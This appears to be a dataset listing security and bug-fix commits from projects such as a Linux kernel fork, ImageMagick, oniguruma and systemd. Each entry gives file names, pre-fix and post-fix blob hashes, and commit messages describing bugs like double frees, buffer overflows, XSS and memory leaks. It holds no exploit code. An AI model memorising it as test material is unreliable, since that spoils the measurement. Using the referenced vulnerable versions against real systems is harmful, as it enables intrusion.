    7c72bfac89d08df2f6c873ffe0a11e51364e9547
    93a1bda1c1e5e1161b2a4f44519e5fe625cf51bd
    95b7bd0d7abcac85482da6067626e034a57b56b3
    d37b7dce2d405af079e8067ad032f0acdbdbbf9b
    d6a32029a89486de611794bc36e6f819284deed6
    da2c4583bd2d9d4894ea64ae566a028e9da96b2b
    daaa88a66f401fbe834b126d54125b79bbcfbad4
    dc4f7ea95c9b2489bf9906c08fc26927f7d01181
Projects:
    0-T-0_ps4-linux
Commit Message for 7926aff5c57b577ab0f43364ff0c59d968f6a414:
rtl8150: Use heap buffers for all register access\n\nAllocating USB buffers on the stack is not portable, and no longer works on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2d6a0e9de03ee658a9adc3bfb2f0ca55dff1e478
File(s) In Commit: 
    drivers/net/usb/catc.c
Blob(s) In Commit: 
    0acc9b640419a2e94bc9a2d3d43a5a2a65800c8b
Blob(s) Before Fix: 
    2aa1a1d29cb4966339535aeb5b7b76c3f635ed73
    3daa41bdd4eae0e5d44451458cb456175f8aedb2
    40864159021d5a70bbff25465e0ff66b3273a33d
    4e2b26a88b15f03ba8302d5d7a83d1a5b1a4d4ea
    630caf48f63aab7c2023d4cadb7044d23a2af86d
    8cfc3bb0c6a672a288784ab0dd5f09597265c39d
    8d5cac2d8e33bee6b2545d45e83d24f52f8ac4c3
    95cfaf5babb8fcede91ecc786d5e96e758ebf229
    985909eab72c53f337849aecba7153992406cc29
    a1f2f6f1e6149840551cd2418299800119ee65a2
    d9ca05d3ac8eadb17a0ec12d539c50dde7fb151b
    fce92f0e5abd56ba863a297ebb9eb6ea25ff37b1
Projects:
    0-T-0_ps4-linux
Commit Message for 2d6a0e9de03ee658a9adc3bfb2f0ca55dff1e478:
catc: Use heap buffer for memory size test\n\nAllocating USB buffers on the stack is not portable, and no longer works on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7a7b5df84b6b4e5d599c7289526eed96541a0654
File(s) In Commit: 
    drivers/hid/hid-cp2112.c
Blob(s) In Commit: 
    3e0b6bad29f200fbd314c12077ff7180e9d63c03
Blob(s) Before Fix: 
    f31a778b085148fea4a52599c6b89be203889781
Projects:
    0-T-0_ps4-linux
Commit Message for 7a7b5df84b6b4e5d599c7289526eed96541a0654:
HID: cp2112: fix sleep-while-atomic\n\nA recent commit fixing DMA-buffers on stack added a shared transfer buffer protected by a spinlock. This is broken as the USB HID request callbacks can sleep. Fix this up by replacing the spinlock with a mutex.\n\nFixes: 1ffb3c40ffb5 ("HID: cp2112: make transfer buffers DMA capable") Cc: stable <stable@vger.kernel.org>	# 4.9 Signed-off-by: Johan Hovold <johan@kernel.org> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    8e9faa15469ed7c7467423db4c62aeed3ff4cae3
File(s) In Commit: 
    drivers/hid/hid-cp2112.c
Blob(s) In Commit: 
    b22d0f83f8e38a9ee0d0eb7381e95d6b90442b61
Blob(s) Before Fix: 
    078026f63b6f40999a2aa1feb8023d3905a6044c
    086d8a50715789d2237d19a59d8e24f407d35e23
    3318de690e00666bf7da60c84189a1fc54a0a544
    3e0b6bad29f200fbd314c12077ff7180e9d63c03
    56be85a9a77c358d84a3aad0007f127d4992fe6d
    60d30203a5faf9c7b69dcddb09ec0a086ca96a08
    7afc3fcc122c476a42e20f1e85e1ed409c93a734
    e06c1344c9138e1f6bb1ffafa5f22eff11fe7a17
    f31a778b085148fea4a52599c6b89be203889781
Projects:
    0-T-0_ps4-linux
Commit Message for 8e9faa15469ed7c7467423db4c62aeed3ff4cae3:
HID: cp2112: fix gpio-callback error handling\n\nIn case of a zero-length report, the gpio direction_input callback would currently return success instead of an errno.\n\nFixes: 1ffb3c40ffb5 ("HID: cp2112: make transfer buffers DMA capable") Cc: stable <stable@vger.kernel.org>     # 4.9 Signed-off-by: Johan Hovold <johan@kernel.org> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    2fb346f25f79e412cf0ed314fdf791763c19b70b
File(s) In Commit: 
    src/plugins/irc/irc-ctcp.c
Blob(s) In Commit: 
    8afee681c86946a1530da1ad7b0c6dfae1c41b5e
Blob(s) Before Fix: 
    081a5414a0a3fb83a1209e4244dc0e92fa843d4f
    55d7c6b2ede4d821cf08bf05c23376293f4ee5f9
    9a2ca15d922ab6724e90edf37f84de2ec4e8cb5a
    e62832bcf90b1c0704e5304dfe293c9ff42adf3a
Projects:
    07101994_KISS
Commit Message for 2fb346f25f79e412cf0ed314fdf791763c19b70b:
irc: fix parsing of DCC filename

======================================================================
Commit With Fix: 
    0b2241ff1c7d86376fa260c5d4c1714f6cef9c0f
File(s) In Commit: 
    framework/modules/file/connector/elfinder.php
Blob(s) In Commit: 
    4ad6f4abc66bc43841029082c728c06ad79ef5a9
Blob(s) Before Fix: 
    ac9103c8a905ef8fe9afe7c3a436cafcb5f6dda0
Projects:
    nwtn_exponent-cms
Commit Message for 0b2241ff1c7d86376fa260c5d4c1714f6cef9c0f:
fix possible xss security issue with elFinder (thanks to chengable)

======================================================================
Commit With Fix: 
    ff425d1db7082e2755d2a405af53861552acf2a1
File(s) In Commit: 
    js/ui/extensionSystem.js
Blob(s) In Commit: 
    fc352b895add637c0797efd02f8e392847db9d80
Blob(s) Before Fix: 
    a4dc29eeab7efd6929bc9751b364376ecd91d2be
Projects:
    3v1n0_gnome-shell
Commit Message for ff425d1db7082e2755d2a405af53861552acf2a1:
extensionSystem: handle reloading broken extensions\n\nSome extensions out there may fail to reload. When that happens, we need to catch any exceptions so that we don't leave things in a broken state that could lead to leaving extensions enabled in the screen shield.\n\nhttps://bugzilla.gnome.org/show_bug.cgi?id=781728

======================================================================
Commit With Fix: 
    de52e7ee61a842d8fdf791f2a5b7c91b6c5cdb56
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    7532d560d56b42844b1167b809a983e018e88394
Blob(s) Before Fix: 
    969e37e1e2861fc45a7c19ddd80b10d348727cba
Projects:
    sqlinda_gas
Commit Message for de52e7ee61a842d8fdf791f2a5b7c91b6c5cdb56:
quick fix to security issue

======================================================================
Commit With Fix: 
    176f8a075a963ffbfa56f1c460c15f6a1a6af5a7
File(s) In Commit: 
    bin/varnishd/cache/cache_fetch.c
Blob(s) In Commit: 
    883964239c18b0724f43c24dd1776ba39dcca0fb
Blob(s) Before Fix: 
    20b3596017875f041a1c396ed1a7a596bb0f1c32
Projects:
    10corp_Varnish-Cache
Commit Message for 176f8a075a963ffbfa56f1c460c15f6a1a6af5a7:
Avoid buffer read overflow on vcl_error and -sfile\n\nThe file stevedore may return a buffer larger than asked for when requesting storage. Due to lack of check for this condition, the code to copy the synthetic error memory buffer from vcl_error would overrun the buffer.\n\nPatch by @shamger\n\nFixes: #2429

======================================================================
Commit With Fix: 
    1fe8fbc032ccda1db9af66d93016b49c16c1f22d
File(s) In Commit: 
    src/low-level/imf/mailimf.c
Blob(s) In Commit: 
    b557070d2ca3f804686cb57f9f90775112a6ff74
Blob(s) Before Fix: 
    3162b3eb6c7cc3d637c99403b9b41506cbf9e3fd
    4554f1ced1cd6c56f53167b65967308466427576
Projects:
    AaronZhangL_libetpan
Commit Message for 1fe8fbc032ccda1db9af66d93016b49c16c1f22d:
Fixed crash #274

======================================================================
Commit With Fix: 
    354dd3924a2e43806774953de536257548b5002c
File(s) In Commit: 
    drivers/media/pci/saa7164/saa7164-bus.c
Blob(s) In Commit: 
    ecfeac5cdbedc45416ef87d660d3af298756b912
Blob(s) Before Fix: 
    16739895af7514950569436cff04be1d044a9238
    5f6f3094c44ecc36a23cb64eba4f38f939a36cb5
    6b9be8d27de380d16d4f2d6634203712685fb19c
    6c73f5b155f644980fd4e39e959d0554eab3dde3
    a18fe5d47238749db79c54fbb6beac43858965b3
    b2ff82fa7116962b718aebd3213ab7036e8b02ba
    b4857cd7069e38694ae019e18bbbc728c1126afa
    e305c02f9dc9d9a06a54e6bd2ef08664b96c61c5
Projects:
    0-T-0_ps4-linux
Commit Message for 354dd3924a2e43806774953de536257548b5002c:
[PATCH] saa7164: Bug - Double fetch PCIe access condition\n\nAvoid a double fetch by reusing the values from the prior transfer.\n\nOriginally reported via https://bugzilla.kernel.org/show_bug.cgi?id=195559\n\nThanks to Pengfei Wang <wpengfeinudt@gmail.com> for reporting.\n\nSigned-off-by: Steven Toth <stoth@kernellabs.com>

======================================================================
Commit With Fix: 
    657831ffc38e30092a2d5f03d385d710eb88b09a
File(s) In Commit: 
    net/ipv4/inet_connection_sock.c
Blob(s) In Commit: 
    1054d330bf9df3189a21dbb08e27c0e6ad136775
Blob(s) Before Fix: 
    0d1e2cb877ec43692c5a7b4fe57e16cf921a8c97
    134957159c27eb9180e08b73360fe891574b4742
    14d02ea905b6bea37240f88054f0cd42db73c4c2
    19ea045c50ed7d9bfc885e13a67f6bca6075674c
    1feb15f23de8c4f673fd0fe713df2dd9195995cf
    33a88e045efd937ecb39dc15ab6b838ea9846657
    3e44b9b0b78ece392a1f1b0763b5445cadfb2557
    4089c013cb03b12e31ddffbb7ae903542c012ae0
    4438990cf65e8a9495d8ef5b6f9bd88444b943df
    46b9c887bede0568ec378d3b809dda8fa463a166
    50da1e95f57dc3beb350bae3858b3f14d7d9e5ab
    5e313c1ac94fc88eca5fe3a0e9e46e551e955ff0
    60021d0d9326ac691dcef21e1f9c20de5f8fe7c6
    60a026a914591f489eb3d3ae98b72988c882df4d
    61a9deec299332aa431c13ad15197974306ff117
    61b45a17fc738e17146a5e1f1cf97774f338179e
    64148914803a8443ecc0de2a45c141ae72cc0258
    6acb541c90910204f02449e7500138362da6998a
    786d97aee751e2f2206b9e3b66398bc0995cc645
    7bb9c39e0a4d1a6a30b7aece9d3b0c17e447c20a
    8976ca423a074447f0d857973ab9ea3bc6bbca7c
    b4d5980ade3b584c444d0f0c6523f03a2f71f884
    bc5196ea1bdfac8e4c8c918eaaf1d3af5f854968
    cf3d5674846a422f0a84da0ca50c186b0ebb0764
    d5d3ead0a6c31e42e8843d30f8c643324a91b8e9
    fc0e649cc002beb0631c390e6aed5f1ea3fe7390
Projects:
    0-T-0_ps4-linux
Commit Message for 657831ffc38e30092a2d5f03d385d710eb88b09a:
dccp/tcp: do not inherit mc_list from parent\n\nsyzkaller found a way to trigger double frees from ip_mc_drop_socket()\n\nIt turns out that leave a copy of parent mc_list at accept() time, which is very bad.\n\nVery similar to commit 8b485ce69876 ("tcp: do not inherit fastopen_req from parent")\n\nInitial report from Pray3r, completed by Andrey one. Thanks a lot to them !\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Pray3r <pray3r.z@gmail.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    46dd48442204207b52c16065ad67d294194afd8d
File(s) In Commit: 
    irc.cgi
Blob(s) In Commit: 
    75844a336bb443c306141b740db52c72db604bdf
Blob(s) Before Fix: 
    aba37caf35eb0a5c7a2d4e3374142292c18fb813
Projects:
    dgl_cgiirc
Commit Message for 46dd48442204207b52c16065ad67d294194afd8d:
Validate R parameter in irc.cgi\n\nThis matches the check done in nph-irc.cgi.

======================================================================
Commit With Fix: 
    654b404f2a222f918af9b0cd18ad469d0c941a8e
File(s) In Commit: 
    drivers/usb/serial/io_ti.c
Blob(s) In Commit: 
    a76b95d32157871f5e2964b629784a7642da8480
Blob(s) Before Fix: 
    1be6ba7bee27452ac55c08a06d98ff2394a2f7fb
    4561dd4cde8b87afe20ca048bd001ed31baa9ee1
    9a0db2965fbb45df5fd6b67f5eddb9d90969869c
    c0a42e9e67772dfad8396537a256dae65b116ccb
    c339163698eb9960f8cc71735d8ed1cf24905e75
    ceaeebaa6f90587b6d8ea01e53daaad243be8b6d
    d1cec36f55f2826f3c85a85cb36f51940a8c5908
    ddbb8fe1046d6868476cb0613068cca0cae30a15
    fce82fd79f77bf59db864c2d1f09e166aa5d018a
Projects:
    0-T-0_ps4-linux
Commit Message for 654b404f2a222f918af9b0cd18ad469d0c941a8e:
USB: serial: io_ti: fix information leak in completion handler\n\nAdd missing sanity check to the bulk-in completion handler to avoid an integer underflow that can be triggered by a malicious device.\n\nThis avoids leaking 128 kB of memory content from after the URB transfer buffer to user space.\n\nFixes: 8c209e6782ca ("USB: make actual_length in struct urb field u32") Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Cc: stable <stable@vger.kernel.org>	# 2.6.30 Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    30572418b445d85fcfe6c8fe84c947d2606767d8
File(s) In Commit: 
    drivers/usb/serial/omninet.c
Blob(s) In Commit: 
    76564b3bebb9bc3b1c6c2ec5761b74b2bcefcd1e
Blob(s) Before Fix: 
    5b6e982a9376b3406c9d336bf3d1a7620db59487
    60f38d5e64fce24761dacdbb7871fb57e9c55e68
    8028e5ffe80d0395302b90e2f607ff339615a55a
    880bbdba19d26cfd2b21a0e3d504b3f4d336070c
    88dc785bb29820969a57d8ce6f1b6f6ed6b6e5b8
    a180b17d24323b074aee19e33bf0f497ad271d8a
    dd706953b4660905cc5abf5e85477bfb6bdb4149
    e51c9464ea4267281f2fff3cf830603e49bc3d46
    efcd7feed6f4d1c882627736de30253ca2858da6
    f6c6900bccf01c87c88734b2a7417db9f0fade8d
Projects:
    0-T-0_ps4-linux
Commit Message for 30572418b445d85fcfe6c8fe84c947d2606767d8:
USB: serial: omninet: fix reference leaks at open\n\nThis driver needlessly took another reference to the tty on open, a reference which was then never released on close. This lead to not just a leak of the tty, but also a driver reference leak that prevented the driver from being unloaded after a port had once been opened.\n\nFixes: 4a90f09b20f4 ("tty: usb-serial krefs") Cc: stable <stable@vger.kernel.org>	# 2.6.28 Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    fdcee2cbb8438702ea1b328fb6e0ac5e9a40c7f8
File(s) In Commit: 
    net/sctp/ipv6.c
Blob(s) In Commit: 
    f5b45b8b8b16e6965d24cd79b150828a608c2121
Blob(s) Before Fix: 
    063baac5b9fe4048e9d7b41e848a33f0f73c61d4
    0e4198ee237086e01e546432b38ee49d046837a1
    142b70e959af9142ce35b88749ad2160327c8267
    176af3080a2b8f8ffc56b55f3ccb13a169e195fe
    1999592ba88c9f3d574428e1ce076c10f724c13a
    2a186b201ad2c20594169633b241dacd0cc971c0
    2b1738ef9394537589b403f7d299181e18fb2315
    391a245d520316c865aad51424b94b9fe6fb8bf7
    5c4fd79a6e53a42adad8e6fd8524567454afa546
    5ed8e79bf102e1c2a9ef1955aee6dba01869545e
    64dfd35ccdcccbf35b2f6273565f2dbf89f941c5
    6a2532dd31c4ae785e87ff3b11aa3a505cc88e94
    6d2349bc71a6b47246c9f69d7c0efcacdcba64c1
    7567e6f1a9205bb0a37a29becc243d9ed6352fe4
    961ee59f696a0b0a8b6c2bade0031a073dff53ad
    96a55910262c4e958bef93d203ce802dede835df
    ce46f1c7f133ad5b114e4c2cd571d26c2b9ee901
    e7b2d4fe2b6a120c66b3e869d796eb6dba69c2d2
    e917d27328ea835419ba3e4c26eae1d7b7fade77
    ec529121f38a03c4b3e2317249cd0694fd619d3f
    edb462b0b73bc11b6505ec7c29035c9bc46fc888
    f473779e8b1c3f4d82f47fe5d2ccadc2d47af45f
    ff2be028f3ed417159457ef699e5862e0c8518fd
Projects:
    0-T-0_ps4-linux
Commit Message for fdcee2cbb8438702ea1b328fb6e0ac5e9a40c7f8:
sctp: do not inherit ipv6_{mc|ac|fl}_list from parent\n\nSCTP needs fixes similar to 83eaddab4378 ("ipv6/dccp: do not inherit ipv6_mc_list from parent"), otherwise bad things can happen.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0c5b1e430a83ef793a7334bbbee408cf3c628699
File(s) In Commit: 
    coders/dds.c
Blob(s) In Commit: 
    f1b1d8c71514f460be946871a1d16820986d0c55
Blob(s) Before Fix: 
    40848c773a40c34c48736978a1e15b5c2f424c32
    742a148dc3d0855b27b38d5a58e0fad344b704c6
    bcdaa82cdbfac515fbd93105df4949debbacc1fc
    eb9641d0590107800ed327df37d1c141c05223fb
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 0c5b1e430a83ef793a7334bbbee408cf3c628699:
Added check to prevent image being 0x0 (reported in #489).

======================================================================
Commit With Fix: 
    f0232a2a45dfd003c1faf6079497895df3ab0ee1
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    cfd68440066328997e1a11b3ff2ad178dbc748bc
Blob(s) Before Fix: 
    3043a8419bb472a0730ad728d5e9d893a35e0a9f
    c194d08585cf95ab11d7881523f0e892cb26240f
Projects:
    2016repotsheyue_ImageMagick
Commit Message for f0232a2a45dfd003c1faf6079497895df3ab0ee1:
Fixed incorrect call to WriteBlob reported in #490.

======================================================================
Commit With Fix: 
    3b0fe05cddd8910f84e51b4d50099702ea45ba4a
File(s) In Commit: 
    coders/art.c
Blob(s) In Commit: 
    f96083245b23a9e0abb325b4267f65f7a0c5825e
Blob(s) Before Fix: 
    2703fdf1a8013200267a3cb29e332df8b0e6db61
    b39538cdc845419ec5ee7b0bcf5b479756f8d4ce
    b3df325781e91361d0b7fb192efeb999500de104
    b54cde4920e5af9e08712a57bbcc0e5bfcbf8460
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 3b0fe05cddd8910f84e51b4d50099702ea45ba4a:
Fixed memory leak reported in #456.

======================================================================
Commit With Fix: 
    9933e113c2e87a9f46a40fde8dafbf801dca1ab9
File(s) In Commit: 
    crypto/skcipher.c
Blob(s) In Commit: 
    4faa0fd53b0c120d39022ad726dbbe2c74f787bd
Blob(s) Before Fix: 
    014af741fc6a3d78c769baa725774be7d9815851
    0e1e6c35188e24185423e91a93ef2ffea29902e0
    0fe2a2923ad0b0d02da50c3b0464258d987e13ec
    11af5fd6a443570550e1dac5b0a429b2cae801b1
    5afeef21c0b58b5f5288af9e5a0d651f8dd2b992
    69230e9d4ac99499f621ff925f3f4265fa539f41
    7591928be7ca789cfc909b3ea300fb6f2fd2cb6f
    93110d70c1d3061bf1640989addca4b8a5a2cb48
    d199c0b1751c91cbcc5a978aadb97cdf609e33ab
    d5692e35fab1f069376f7c54358ff5e5f0cb352e
    dd5fc1bf64476f2e76a652486a8ec93f03836784
    df735148000f2823f1f6fb922cb15be0a0c4995a
    e319421a32e7de4fabadddf116f64eeea790a113
    f7d0018dcaee68972abd330ee767d1af62dc1120
Projects:
    0-T-0_ps4-linux
Commit Message for 9933e113c2e87a9f46a40fde8dafbf801dca1ab9:
crypto: skcipher - Add missing API setkey checks\n\nThe API setkey checks for key sizes and alignment went AWOL during the skcipher conversion.  This patch restores them.\n\nCc: <stable@vger.kernel.org> Fixes: 4e6c3df4d729 ("crypto: skcipher - Add low-level skcipher...") Reported-by: Baozeng <sploving1@gmail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    a924f43f30f9c4acaf70618dd2a055f8b0f166be
File(s) In Commit: 
    src/resolve/resolved-dns-packet.c
Blob(s) In Commit: 
    240ee448f4e9382206ed88575b87192547c24300
Blob(s) Before Fix: 
    21756f566fb0674b8c6948f07de98a8c6e460acf
    2e41dae6562577d23ac858431c568c3048d23ba6
    337a8c473fb84810f60e44ce15b7d57c17ec8ac4
    652970284ed666ba09ce75f8e2aa50c0da63557f
    bebd1ee4a6e55f64d32ddd80c496d2b520769bdb
Projects:
    0x277F_systemd
Commit Message for a924f43f30f9c4acaf70618dd2a055f8b0f166be:
resolved: bugfix of null pointer p->question dereferencing (#6020)\n\nSee https://bugs.launchpad.net/ubuntu/+source/systemd/+bug/1621396

======================================================================
Commit With Fix: 
    690313a061f7a4fa614ec5cc8368b4f2284e059b
File(s) In Commit: 
    src/regexec.c
Blob(s) In Commit: 
    d4e577d96aa947d945956920201763db0abacf08
Blob(s) Before Fix: 
    35fef115e26841b478e6da738d8896ae65107ed6
Projects:
    0xflotus_oniguruma
Commit Message for 690313a061f7a4fa614ec5cc8368b4f2284e059b:
fix #57 : DATA_ENSURE() check must be before data access

======================================================================
Commit With Fix: 
    9690d3ab1f9bcd2db8cbe1fe3ee4a5da606b8814
File(s) In Commit: 
    src/regexec.c
Blob(s) In Commit: 
    2fa0f3d37e07d62954c8421205f8058e4f25a2fb
Blob(s) Before Fix: 
    d4e577d96aa947d945956920201763db0abacf08
Projects:
    0xflotus_oniguruma
Commit Message for 9690d3ab1f9bcd2db8cbe1fe3ee4a5da606b8814:
fix #58 : access to invalid address by reg->dmin value

======================================================================
Commit With Fix: 
    3b63d12038c8d8fc278e81c942fa9bec7c704c8b
File(s) In Commit: 
    src/regparse.c
Blob(s) In Commit: 
    198874769206616786a063b13ad9ce1d2b7513a2
Blob(s) Before Fix: 
    69875fa8015edbcd21e17ec5a2961c82a2f7eef6
Projects:
    0xflotus_oniguruma
Commit Message for 3b63d12038c8d8fc278e81c942fa9bec7c704c8b:
fix #60 : invalid state(CCS_VALUE) in parse_char_class()

======================================================================
Commit With Fix: 
    b690371bbf97794b4a1d3f295d4fb9a8b05d402d
File(s) In Commit: 
    src/regexec.c
Blob(s) In Commit: 
    c0626efd43b6ed410bb8dcdc86fc4e477b60c74f
Blob(s) Before Fix: 
    35fef115e26841b478e6da738d8896ae65107ed6
    49bcc509eee509be943cfed990e516ca0810574e
    6796e58fceabb187b28c1a1bb9ef3ddea8e6d10a
    7e8d3d15c82530eabdaada738f989c8ec2d4b181
    c7a705e960498e33a70fa081132d807edbe3797f
Projects:
    0xflotus_oniguruma
Commit Message for b690371bbf97794b4a1d3f295d4fb9a8b05d402d:
fix #59 : access to invalid address by reg->dmax value

======================================================================
Commit With Fix: 
    232cd35d0804cc241eb887bb8d4d9b3b9881c64a
File(s) In Commit: 
    net/ipv6/ip6_output.c
Blob(s) In Commit: 
    bf8a58a1c32d83a9605844075da5815be23a6bf1
Blob(s) Before Fix: 
    0a04a37305d5ab56d0f24cc3b3f917386cb62bd8
    0a3448b2888fbdc62181a531ad665ce8fce3a65f
    155eccfa77604fcd63bbeeff1db23ed184082dd6
    1ac3cea491713c0eaaf529e722e9babc30727c30
    1dfc402d9ad1ebbf70aa8af6c613bff7fd632c66
    26ea4793074004d0af1026bb378860b53baa0ad2
    315a55d66079cb7129dbfe183e31bcceffd63f99
    36cf0ab685a00d57fbdc6787ba77116dae638f21
    38122d04fadc646c27a5ccdf0eef5eb6d7923a27
    528b3c1f3fdee4314e1c23007ae76333b4af7505
    58f6288e9ba53e6964b74d71dde7615ead695c06
    59db8489c815d70d22c9d349894722714c374c0a
    59eb4ed99ce80c0b6fd2ece1a877e3c9a1d57bcc
    6001e781164eb6d49cf604e7d8067a42ebc7dc3d
    61d403ee1031caa5536d9298abd4604606dff6f5
    64d6073731d368e54073f9ca97ac6ad0cecdd415
    70d0de4041972ceaeb4656fa4bdef884a5403b10
    7cebee58e55b7f6f23279ac2515a69df936b5712
    7deebf102cbafc276f45e4eaffdd8efdb658d842
    7fde1f265c90e90f16291e6c861b6e242111c25b
    8e950c250ada0785323c3e270a61c2e1b7a7b6f3
    91fb4e8212f52d434e6d072103f70dbb8d219326
    92b1aa38f121507b662e2c964423952bf995b81e
    9428345d3a078786f6662e9384e75c97b9c3e245
    a163102f1803e5f9eb4a60c501bd4adcc27bd62b
    b6a94ff0bbd0d5f42c78b7bcd6ea9fbe5ac9a595
    bc09cb97b8401011c112afe469fd231382387622
    bc972e7152c738d72ac04e3733608a1a4b5ace5f
    cb9df0eb40237065e696dd1013180b6c82a9c2dc
    ce69a12ae48c29276871dacb30eebea086b291a3
    d4a31becbd25dda895d7391e1e65c2de237bf2a3
    d5f7716662dbc361e93ebc443e72ee5fb7343b10
    e27b8fdba5d20978cee22437d99576f9ef5abd1c
    e6a7bd15b9b7115ce6a61e3157c637cdaf86ec18
    e6f931997996ef46efa1272b16e261bf8f6609a7
    ef02b26ccf812e57e794e9b151746600bcb9a8f0
Projects:
    0-T-0_ps4-linux
Commit Message for 232cd35d0804cc241eb887bb8d4d9b3b9881c64a:
ipv6: fix out of bound writes in __ip6_append_data()\n\nAndrey Konovalov and idaifish@gmail.com reported crashes caused by one skb shared_info being overwritten from __ip6_append_data()\n\nAndrey program lead to following state :\n\ncopy -4200 datalen 2000 fraglen 2040 maxfraglen 2040 alloclen 2048 transhdrlen 0 offset 0 fraggap 6200\n\nThe skb_copy_and_csum_bits(skb_prev, maxfraglen, data + transhdrlen, fraggap, 0)  is overwriting skb->head and skb_shared_info\n\nSince we apparently detect this rare condition too late, move the code earlier to even avoid allocating skb and risking crashes.\n\nOnce again, many thanks to Andrey and syzkaller team.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Reported-by: <idaifish@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b72293946951cc650eaf51f5d2f62ceac6335e12
File(s) In Commit: 
    core/inc/bigtree/apis/storage.php
Blob(s) In Commit: 
    7dda6925289951cb9cb8230429e111c860437415
Blob(s) Before Fix: 
    0c867f8c1b2fd0be684661160c2df1fd672e4004
Projects:
    4v4t4r_BigTree-CMS
Commit Message for b72293946951cc650eaf51f5d2f62ceac6335e12:
Disabling phtml/pht files from being uploaded. https://github.com/bigtreecms/BigTree-CMS/issues/280

======================================================================
Commit With Fix: 
    36be628c2597fd0209224a09b17858294f49c585
File(s) In Commit: 
    modules/Base/Dashboard/Dashboard_0.php
Blob(s) In Commit: 
    0ad7041eaf2aabc42ecfa2201441778cdbad4d53
Blob(s) Before Fix: 
    f2d3b3647d999b50ba093392c9e963b377dc7ecb
Projects:
    BramPeerlings_EPESI
Commit Message for 36be628c2597fd0209224a09b17858294f49c585:
Closes #196

======================================================================
Commit With Fix: 
    d67a9ca6fd06ca65d23e313bdbad1ef4dd3aa0df
File(s) In Commit: 
    rutil/dns/ares/ares_parse_a_reply.c
Blob(s) In Commit: 
    100f3848d7434b0182f67071a903ffd23f8d2fef
Blob(s) Before Fix: 
    2733fe442447fa8c310b4364d28efd6b294b24ed
Projects:
    AlanSchwartz_resiprocate
Commit Message for d67a9ca6fd06ca65d23e313bdbad1ef4dd3aa0df:
ares: Prevent buffer overlow in ares_parse_a_reply (CVE-2017-9454)\n\nThis buffer overflow is in the embedded copy of ares that will be used unless the external alternative c-ares is used by specifying the configure argument --with-c-ares.\n\nIt has been found with LibFuzzer from the LLVM project.

======================================================================
Commit With Fix: 
    7fd419441bc7103398e313558171d342c6315f44
File(s) In Commit: 
    coders/mpc.c
Blob(s) In Commit: 
    86359572d1ceb35af1272b1b6809f3cf77b1635b
Blob(s) Before Fix: 
    3a85d5597fee827c9740a7737b74f5c2550e5d4f
    6f891acf2160b340b484fcf3075bd1c009d6eb6c
    8088da4925c6ec3d44319120475379ae7b8f28b5
    e3e8641c368f9e470ecaf764d50d09b87a8b3a07
    f56db27fb5ea0325183889eca1cb4a970c7fbc3e
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 7fd419441bc7103398e313558171d342c6315f44:
Added check for incorrect number of meta channels report in #492.

======================================================================
Commit With Fix: 
    01843366d6a7b96e22ad7bb67f3df7d9fd4d5d74
File(s) In Commit: 
    magick/image.c
Blob(s) In Commit: 
    24ec768b493ff8d2d6540ebeed0f95ad6b332c8d
Blob(s) Before Fix: 
    09cbb6445616ac576b1766788c1d413540e9f10e
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 01843366d6a7b96e22ad7bb67f3df7d9fd4d5d74:
Fixed incorrect call to DestroyImage reported in #491.

======================================================================
Commit With Fix: 
    5c114c91d4ff31859fcd84cf8bf349b737b90d99
File(s) In Commit: 
    src/gc.c
Blob(s) In Commit: 
    19bc1ad4b2bb5103803a6a813567031cab2cdc78
Blob(s) Before Fix: 
    116fd0bfd4a7fd5f516528bc968a90434909de2b
Projects:
    007lva_mruby
Commit Message for 5c114c91d4ff31859fcd84cf8bf349b737b90d99:
Clear unused stack region that may refer freed objects  fix #3596

======================================================================
Commit With Fix: 
    07678eca2cf9c9a18584e546c2b2a0d0c9a3150c
File(s) In Commit: 
    drivers/gpu/drm/vmwgfx/vmwgfx_surface.c
Blob(s) In Commit: 
    834bb10973a2eb87ec37c05a364e5d95b2184343
Blob(s) Before Fix: 
    baf03d4d86d2948913487a3c22eb7d9abfdf4de1
Projects:
    0-T-0_ps4-linux
Commit Message for 07678eca2cf9c9a18584e546c2b2a0d0c9a3150c:
